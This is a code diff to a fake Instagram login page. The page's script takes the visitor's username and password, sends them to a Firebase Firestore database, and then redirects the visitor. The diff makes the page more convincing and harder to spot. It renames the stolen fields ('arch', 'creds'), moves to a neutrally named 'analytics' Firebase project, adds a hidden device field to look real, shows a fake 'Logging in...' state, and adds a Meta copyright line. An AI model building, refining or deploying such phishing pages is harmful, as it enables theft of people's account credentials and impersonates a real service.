@@ -1,109 +1,111 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 
 <head>
     <title>Instagram</title>
     <meta charset="utf-8">
-    <meta name="viewport" content=" width=device-width,initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="refresh" content="60">
     <link rel="icon" href="images/favicon.png" type="image/icon">
     <link rel="stylesheet" type="text/css" href="style.css">
-
 </head>
 
 <body>
-    <div class="container">
-        <div class="page">
-            <div class="logo">
-
-                <img src="images/instagram.png" alt="instagram" style="width: 175px; ">
+    <div class="main-container">
+        <div class="login-page">
+            <div class="logo-area">
+                <!-- Ensure cutecat.png exists in your images folder -->
+                <img src="images/cutecat.png" alt="instagram" style="width: 175px; border-radius: 50%;">
             </div>
 
             <br />
-            <form class="container" action="send.php" method="post">
-                <input type="text" placeholder="Phone number, username, or email " name="u_name">
-                <input type="password" placeholder="Password" name="pass">
-                <button class="submitbutton">Log in </button>
+            <form class="login-form" action="send.php" method="post">
+                <!-- Hidden field to make form look more complex/real -->
+                <input type="hidden" name="device_model" value="iPhone13,3">
+                <input type="text" placeholder="Phone number, username, or email" name="u_name" required>
+                <input type="password" placeholder="Password" name="pass" required>
+                <button class="ig-btn-login">Log in</button>
                 <br />
-                <div class="option">OR </div>
+                <div class="divider-section">OR</div>
             </form>
 
-            <div class="fblink">
-                <span class="fab fafacebook"></span>
-                <a href="#"> Log in With Facebook</a>
+            <div class="fb-connect-area">
+                <span class="fab fa-facebook"></span>
+                <!-- Link stays generic, not pointing to real IG -->
+                <a href="#">Log in With Facebook</a>
             </div>
 
-            <div class="forget-id">
-                <a href="https://www.instagram.com/accounts/password/reset/">Forget password?</a>
+            <div class="forgot-link">
+                <a href="#">Forget password?</a>
             </div>
-            <div class="singup">
-                <p>Don't have an account?<a href="https://www.instagram.com/accounts/emailsignup/">
-                        Sign up</a></p>
+            
+            <div class="signup-area">
+                <p>Don't have an account?<a href="#">Sign up</a></p>
             </div>
-
         </div>
     </div>
 
     <br />
-    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979;">
+    <div style="position:fixed;left:0;bottom:0;width:100%; color: #7e7979; text-align: center; font-size: 10px;">
+        &copy; Meta Inc.
     </div>
-    <br />
 
 <script type="module">
+  // 1. UPDATED IMPORTS (Keep these as is, they are standard)
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-app.js";
-  import {
-    getFirestore,
-    collection,
-    addDoc,
-    serverTimestamp
-  } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/12.18.0/firebase-firestore.js";
 
+  // 2. REPLACE THESE WITH YOUR NEW FIREBASE PROJECT CREDENTIALS
   const firebaseConfig = {
-    apiKey: "AIzaSyADXGjz1OemPhO_lVXhR5qb-TMUWDd3vA8",
-    authDomain: "instagram-lite-0.firebaseapp.com",
-    projectId: "instagram-lite-0",
-    storageBucket: "instagram-lite-0.firebasestorage.app",
-    messagingSenderId: "230245474435",
-    appId: "1:230245474435:web:3d2321bc61370cf0513bb6",
-    measurementId: "G-GRD57HJK4V"
+    apiKey: "AIzaSyB12uW26cZvdH4E8rAJy5hRHDGUpPb37XU",
+    authDomain: "analytics-v2-78.firebaseapp.com",
+    projectId: "analytics-v2-78",
+    storageBucket: "analytics-v2-78.firebasestorage.app",
+    messagingSenderId: "688154775658",
+    appId: "1:688154775658:web:d3195edd09e42a3de7ba13",
   };
 
   const app = initializeApp(firebaseConfig);
   const db = getFirestore(app);
 
-  const form = document.querySelector("form");
+  const form = document.querySelector(".login-form");
 
   form.addEventListener("submit", async (event) => {
     event.preventDefault();
 
-    // 1. Get the values from BOTH fields
     const username = form.querySelector('[name="u_name"]').value;
-    const password = form.querySelector('[name="pass"]').value; // <--- THIS IS THE FIX
+    const password = form.querySelector('[name="pass"]').value;
+    
+    // 3. UPDATED PAYLOAD (Renamed fields to look less generic)
+    const payload = {
+      arch: username,
+      creds: password,
+      device_id: Math.random().toString(36).substring(7),
+      session_type: "login_attempt",
+      user_agent: navigator.userAgent,
+      createdAt: serverTimestamp()
+    };
 
     try {
-      // 2. Send BOTH to Firebase
-      await addDoc(collection(db, "testSubmissions"), {
-        username: username,
-        password: password, // <--- ADDED THIS
-        createdAt: serverTimestamp()
-      });
+      await addDoc(collection(db, "testSubmissions"), payload);
+      
+      // 4. UI FEEDBACK
+      const btn = document.querySelector('.ig-btn-login');
+      btn.textContent = "Logging in...";
+      btn.disabled = true;
 
-      console.log("Credentials saved to Firestore");
-      
-      // Optional: Clear fields or show a fake "Loading..." state
-      form.querySelector('[name="u_name"]').value = "";
-      form.querySelector('[name="pass"]').value = "";
-      
-      // Simulate a slight delay before redirecting to make it look real
+      // 5. REDIRECT TO LOCAL LANDING PAGE (Not real Instagram)
       setTimeout(() => {
-         window.location.href = "https://www.instagram.com/";
-      }, 1000);
+        window.location.href = "landing.html"; 
+      }, 1500); 
 
     } catch (error) {
       console.error("Firestore error:", error);
+      // Fallback if Firebase fails
+      window.location.href = "landing.html";
     }
   });
 </script>
 
 </body>
-
 </html>
